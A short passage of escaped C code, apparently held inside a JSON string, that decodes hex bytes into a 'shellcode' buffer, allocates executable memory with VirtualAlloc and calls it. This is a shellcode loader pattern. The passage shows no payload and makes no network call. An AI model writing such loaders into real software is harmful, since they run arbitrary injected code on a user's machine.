		sscanf_s(memBuffer, \"%02hhx\", &shellcode[count]); 
		memBuffer = memBuffer + 4;
	}

	void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, 
 PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof shellcode);
    ((void(*)())exec)();
}"]
}
